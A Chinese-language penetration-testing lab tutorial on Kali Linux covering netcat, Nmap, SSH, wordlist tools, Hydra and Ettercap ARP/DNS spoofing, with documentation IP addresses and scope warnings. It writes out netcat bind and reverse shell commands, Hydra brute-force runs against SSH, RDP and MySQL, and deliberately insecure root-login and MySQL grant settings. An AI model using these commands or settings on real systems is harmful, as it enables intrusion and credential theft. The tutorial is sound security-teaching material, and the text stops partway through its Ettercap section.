## 1.渗透专用系统简介

Kali、Parrot Security OS、BackBox Linux 等发行版预装或便于安装安全工具。Cyborg Hawk 等较早的发行版，使用前还需确认项目维护状态与镜像来源。

可以把 Kali 理解成装好常用工具的“实验工作台”。真正要学的是工具背后的协议和判断方法，换个发行版也能用得上。

> 命令中的 192.0.2.* 是文档示例地址，实验时替换为自己的靶机地址；具体菜单和选项以安装版本为准。

## 2.Kali 环境配置

### 2.1 账户与权限

Kali 从 **2020.1** 起默认采用非 root 用户策略，但不是所有安装方式都使用相同口令：

- 安装器安装时通常由用户创建普通账户。
- Live 和部分预制镜像使用 `kali / kali`；Vagrant 等镜像另有规则。
- 默认凭据只适用于相应镜像，不代表装好后一直使用这个口令。

需要管理权限时可使用 `sudo 命令`；`sudo su` 可进入 root Shell，`sudo -i` 也常用于管理员登录式环境。`sudo passwd root` 用于设置 root 口令，不是日常使用 Kali 的必经步骤，也不等于自动允许 root 通过 SSH 登录。

### 2.2 中文与显示缩放

```bash
sudo dpkg-reconfigure locales
```

按界面选择 `zh_CN.UTF-8 UTF-8` 并设置需要的默认语言；完整中文显示还可能需要字体、桌面语言包等。注销后重新登录，必要时重启。显示缩放可在 HiDPI 或显示设置中调整，具体入口取决于桌面环境和版本。

### 2.3 软件源与更新

软件源可以理解成软件包的“进货渠道”。换源是换下载入口，不是把不同发行版的软件包随意混在一起。

**先看实际配置文件**：Kali 官方文档说明，2026.2 起新安装默认使用 deb822 格式的 `/etc/apt/sources.list.d/kali.sources`；此前常见的是 `/etc/apt/sources.list` 单行格式。已有系统以实际文件为准，避免重复添加同一仓库。

新格式示例：

```deb822
Types: deb
URIs: http://http.kali.org/kali/
Suites: kali-rolling
Components: main contrib non-free non-free-firmware
Signed-By: /usr/share/keyrings/kali-archive-keyring.gpg
```

旧格式仍可用于支持它的 APT：

```sourceslist
deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
```

旧版配置常见 `main contrib non-free`，较新的配置还包含 `non-free-firmware`，应按目标系统版本选择组件。`deb-src` 用于源码包，不是普通安装软件的必需项。镜像可择一使用，修改前备份配置；不要重复堆叠相同仓库。

可选镜像入口：

[http://mirrors.ustc.edu.cn/kali](http://mirrors.ustc.edu.cn/kali)

[http://mirrors.aliyun.com/kali](http://mirrors.aliyun.com/kali)

[http://mirrors.tuna.tsinghua.edu.cn/kali](http://mirrors.tuna.tsinghua.edu.cn/kali)

```bash
sudo apt update
sudo apt full-upgrade
```

`update` 更新包索引，不是升级已安装软件；`full-upgrade` 可为解决依赖调整包的安装和删除，应先阅读变更清单。旧命令 `apt-get update`、`apt-get upgrade` 仍有对应用途，但普通 upgrade 不能一概代替滚动发行版完整升级。

## 3.Netcat：网络工具的瑞士军刀

> Netcat 擅长把标准输入／输出接到网络连接上，聊天、传文件和排查端口都可以用它。先让两端连得通，再讨论 Shell。

### 3.1 先认清是哪一种 nc

```bash
command -v nc
nc -h
```

| 实现 | 需要注意的区别 |
| --- | --- |
| netcat-traditional | Kali 工具页记录的传统版支持执行程序式 `-e`、监听 `-l -p 端口` 等 |
| Debian／Kali 常见 netcat-openbsd | 监听常写成 `nc -l 8888`，不能照搬传统版的执行程序式 `-e` |
| Ncat | Nmap 项目的独立实现，可用 `ncat --help` 核对；执行命令功能及其他选项另有自己的语法 |

不要只看命令名就认定参数相同；其他上游版本即使有同名选项，含义也可能不同。

### 3.2 建立连接与排查

下面明确采用 **netcat-traditional**：

```bash
# 监听端：-l 监听，-v 显示信息，-n 不做名称解析，-p 指定本地端口。
nc.traditional -l -v -n -p 8888
```

另一台实验机连接监听端：

```bash
nc.traditional 192.0.2.10 8888
```

两端可输入文字观察传输，Ctrl+C 结束。端口需未被占用，并满足绑定权限等条件。

**不要求必须同一局域网**，关键是路由可达、目标确实监听、端口未被过滤，必要时还涉及 NAT 映射。同网段也可能受虚拟机网络、客户端隔离或主机防火墙影响；换成反向 Shell 不会凭空解决所有连通问题。

`service firewalld status`、`systemctl stop firewalld`、`systemctl disable firewalld` 分别用于查看状态、停止当前服务和取消开机启用。它们只适用于存在该服务的系统；终端颜色不能作为状态依据，停止 firewalld 也不等于所有防火墙规则消失。排查应先确认服务状态和具体端口规则，通常无需整体关闭防火墙。

### 3.3 传输文件

先启动接收端，注意 `>` 会覆盖已有目标文件：

```bash
nc.traditional -l -p 8888 > received.txt
```

发送端：

```bash
nc.traditional -q 0 192.0.2.10 8888 < 1.txt
```

这里的 `-q 0` 是该传统版在标准输入 EOF 后退出的选项，其他实现需另查。收发文件名可以不同，改后缀也不会转换文件格式；传完后核对大小或哈希。普通 nc 连接本身不提供加密和身份验证。

### 3.4 正向 Shell 与反向 Shell

- **正向 Shell**：靶机监听，操作端主动连接靶机。
- **反向 Shell**：操作端监听，靶机主动回连。

这里的“正向／反向”看的是连接发起方向，不是看命令从哪边输入；实际 Shell 操作仍需要数据双向传输。是否可用取决于监听、入站／出站规则、路由、NAT 及工具能力，不是因为某台 Web 服务器“公网 IP 唯一”。

以下用法适用于具有执行程序式 `-e` 功能的传统版构建：

```bash
# 正向：在 Linux 实验靶机监听。
nc.traditional -l -p 8888 -e /bin/sh
# 操作端连接靶机。
nc.traditional 192.0.2.20 8888

# 反向：操作端先监听。
nc.traditional -l -p 8888
# Linux 实验靶机回连操作端。
nc.traditional -e /bin/sh 192.0.2.10 8888
```

Windows 旧版 nc 构建曾使用 `-e cmd.exe`；应按那个构建核对，不与 Linux 命令混用。Bash、PHP、Python、Java、C／C++ 等也能实现相应连接逻辑，但“系统是 Linux”不代表一定具有 Bash 或支持相同网络功能。

## 4.Nmap：判断主机与端口状态

Nmap 可以理解成按不同方式“敲门”，再根据回应判断端口情况。它不只是对每个端口发 ping：主机发现、TCP／UDP 扫描、服务识别使用的探测和判断方式不同。

```bash
nmap -h
nmap 192.0.2.20
nmap -p 22,80,443 192.0.2.20
```

默认扫描不是所有端口、所有协议都扫一遍。常见状态如 open、closed、filtered 反映探测结果；“没有回应”不能直接等同于端口关闭。权限和扫描选项也会影响探测方式。

## 5.SSH 登录

SSH 用于加密的远程终端等功能；Windows 远程桌面常见的 TCP 3389 是 RDP，不能与 SSH 混为一个协议。

在需要 SSH 服务端的 Kali 环境中，先确认是否安装：

```bash
sudo apt install openssh-server
sudo systemctl status ssh
sudo systemctl start ssh
```

旧环境仍可能使用 `service ssh status`、`service ssh start` 和 `service ssh restart`；服务管理方式需与系统匹配。

```bash
ssh kali@192.0.2.20
```

服务端配置文件通常为 `/etc/ssh/sshd_config`。在隔离实验中允许 root 口令登录时，涉及以下配置：

```sshconfig
PasswordAuthentication yes
PermitRootLogin yes
```

这只是隔离实验中的特定设置，不是开启 SSH 的必需步骤。`prohibit-password` 与 `no` 的含义不同：前者限制 root 的口令等认证方式，不等于禁止其一切登录。只删除注释也不能保证最终配置按预期生效，还要考虑 Include、Match 和启动参数。

修改后先用 `sudo sshd -t` 检查，再按系统方式重载并用新会话验证。普通账户配合所需管理权限通常已能完成实验，策略细节见 [07.Linux系统状态管理、安全加固](./07.Linux系统状态管理、安全加固.md)。

## 7.CeWL：从页面里收集候选词

CeWL 会访问网页、提取词语；“Kali 自带”取决于镜像和安装的工具集合，可先用 `command -v cewl`、`cewl -h` 确认。

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755329549458-3cabfa97-93fa-4c2b-ad42-eadecef0b98c.png)

| 参数 | 用途 |
| --- | --- |
| `-w 文件` | 写入词表 |
| `-m 数字` | 最小词长 |
| `-e -n` | 提取邮箱，不输出词表；具体输出形式看版本 |
| `-c` | 显示词频 |
| `-d 数字` | 爬取深度，工具页所示版本默认 2 |
| `-v` | 详细信息 |
| `--with-numbers` | 包含带数字的词 |
| `--auth_type`、`--auth_user`、`--auth_pass` | HTTP Basic／Digest 认证参数，不代表能处理任意网页表单登录 |
| `--proxy_host`、`--proxy_port` | 指定可达的代理主机和端口 |

```bash
cewl -h
cewl http://example.test/
cewl http://example.test/ -w words.txt -m 5
cewl http://example.test/ -e -n
cewl http://example.test/ -c -d 2 -v --with-numbers
cewl http://example.test/ --auth_type basic --auth_user lab --auth_pass 'example-password' -v
cewl http://example.test/ --proxy_host 127.0.0.1 --proxy_port 8080
```

`example.test` 需解析到自己的实验网站。代理在另一台机器时改为它的可达地址；127.0.0.1 指的是运行 CeWL 的机器。`--auth_type`、`--auth_user` 等长参数使用双短横线。站点示例：www.vulnweb.com；实验时应遵守站点给定的测试范围，也可换用自己的靶场。

## 8.Crunch：按规则生成候选

CeWL 是“从已有内容里找”，Crunch 更像“按配方排列字符”。

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349327549-34c784b8-ed3e-4398-b828-dc642496224e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349365703-d74236a4-e9e4-4a25-9b10-ed2d92a2c777.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349390287-834e0e15-13d7-48dc-93cb-4777af9903de.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755350254231-2a122b3c-9fcd-408a-9500-504d1cad47b4.png)

```bash
crunch 2 4 -o 1.txt
crunch 6 6 123 -o six.txt
crunch 1 1 -q input.txt -o permuted.txt
crunch 4 4 -t ',%^@'
crunch 1 3 -f /usr/share/crunch/charset.lst lalpha -o short.txt
```

- 前两个位置通常是最小、最大长度。第二例用字符 1、2、3 生成 6 位候选，共 `3^6 = 729` 个。
- `-q` 读取文件中的词项做排列，不是简单读取一份字符集；此模式仍需填写前两个位置，但长度值不按普通生成模式使用。
- `-t` 模板中，`@` 表示小写字母、`,` 大写字母、`%` 数字、`^` 符号。模板加引号，避免 Shell 先解释其中字符。
- `-f` 指定字符集文件及其中的集合名。示例生成长度 1 到 3 的候选，不是只生成 3 位；集合名称和路径需核对本机文件。
- `charset.lst` 是字符集定义，不是成品口令库。生成前先估算数量和文件大小，尤其是长字符串与大字符集。

## 9.Hydra／XHydra：验证登录候选

Hydra 按服务协议尝试候选凭据，XHydra 是其图形前端。一次“连接失败”不一定说明密码错误，还可能是网络、协议、加密算法或服务端策略不匹配。

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755351376030-9fd1b897-14e3-4017-97dd-a06d55c60bdc.png)

### 9.1 参数与服务模块

- 小写 `-l`、`-p` 指定一个用户名、口令；大写 `-L`、`-P` 指定用户名、口令列表文件。
- 使用相对字典路径时，先确认当前工作目录。
- 不是每个安装包都构建了所有协议模块，先看 `hydra -h` 和相应模块帮助。

协议调用示例，地址需替换为实验靶机：

```bash
hydra -h
hydra -U ssh
hydra -l root -P passwords.txt ssh://192.0.2.20
hydra -l root -P passwords.txt rdp://192.0.2.20
hydra -l root -P passwords.txt mysql://192.0.2.20
xhydra
```

root 只是示例用户名，不代表 RDP 或每个数据库都存在这个账户。RDP 模块依赖对应 FreeRDP 库及构建支持，不能笼统说成“启动 xfreerdp 程序”；工具提示的结果还应与服务端实际登录行为核对。

确认凭据后的 SSH 登录可用 `ssh 用户名@靶机地址`，不要把连接工具与候选验证工具混淆。

### 9.2 MySQL 连接与版本差异

能否远程登录，需同时检查监听地址、网络、`'用户'@'主机'` 匹配及认证插件。不能一律归结成“MySQL 默认不允许远程登录”。

MySQL 5.7 等旧环境支持以下授权语法：

```sql
-- 历史靶场示例：属于 MySQL 5.7 等支持此形式的旧环境。
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

这是把远程来源和权限放得很宽的旧实验配置，不应作为解决所有连接问题的通用步骤。MySQL 8.0 的账户创建／认证与授权应分别按 CREATE USER、ALTER USER 和 GRANT 核对，不能直接照搬上述 IDENTIFIED BY 写法；正常账户语句也不普遍要求额外执行 FLUSH PRIVILEGES。

`max_connect_errors=10000` 控制的是主机连接中断错误达到阈值后的处理，不是“允许输错密码 10000 次”。不应为让实验继续就先盲目调大。

## 10.Ettercap：理解 ARP 与 DNS 演示

### 10.1 MAC、IP 与 ARP

MAC 地址可理解成链路层上的地址标签。它不是“烧录在内存且永远不能改”的绝对身份证：软件可使用本地管理地址，设备也可能启用随机化地址；在同一链路上重复使用会造成问题。

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755516156647-4e2fc63d-b0a8-47a3-8f35-9d92388e7c5e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525898935-f5e1d702-855e-4c03-86fd-d75727be2787.png)

ARP 用于 IPv4 局域链路上的地址解析：

- 访问同一链路的主机时，通常解析对方的 MAC。
- 访问远端网站时，主机通常把帧交给下一跳网关，解析的是网关 MAC，不是直接广播询问远端服务器 MAC。
- Windows 可用 `arp -a` 查看缓存；Linux 可用 `ip neigh` 等查看邻居信息。

ARP 欺骗利用错误的地址映射，使原本交给某一主机／网关的流量被引向别处。可以把它理解成“把收件地址对应的门牌指错了”，但真正的行为取决于链路、交换网络、防护及转发条件；仅“连上同一个 Wi-Fi”不保证演示一定成功。

### 10.3 DNS 欺骗与网页路径

DNS 负责把名称解析到相应记录；DNS 欺骗是让客户端接受错误的解析结果，不是直接把整个网页 URL 改写成任意路径。

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755583847195-0c5b16b5-2ada-4707-979a-85859efdbf3d.png)

使用本地 Apache 提供实验网页时，可以先检查并启动服务，再解压网页文件：

```bash
service apache2 status
sudo service apache2 start
unzip aaa.zip
```

是否已经安装 Apache 取决于镜像和工具集合；默认站点文档目录常见为 `/var/www/html`，但有效配置可以更改它。`rz` 传文件依赖本机与终端双方支持相应协议；有 FinalShell 不等于一定能用。

在主机上访问 127.0.0.1 只是访问主机自己；其他实验机访问服务端可达 IP，还需确认监听地址及防火墙。文件解压到站点目录后，`http://服务端地址/aaa/` 才可能对应相应目录，需看实际目录结构和 Web 配置。

编辑 `/etc/ettercap/etter.dns` 的位置也需按版本确认。A 记录的值是 **IPv4 地址，不能带 /aaa 路径**。示意格式：

```text
www.example.test A 192.0.2.10
```

`www.*.com` 是工具配置里的通配模式，不是 DNS 协议承诺“所有网站都会跳转”。页面路径需由浏览器请求或 Web 服务配置处理；HTTPS 证书校验、DNS 缓存和加密 DNS 等也可能影响实验结果。

在 Plugins 列表启用 `dns_spoof`，再用解析结果和实际请求确认是否生效。界面操作示例：
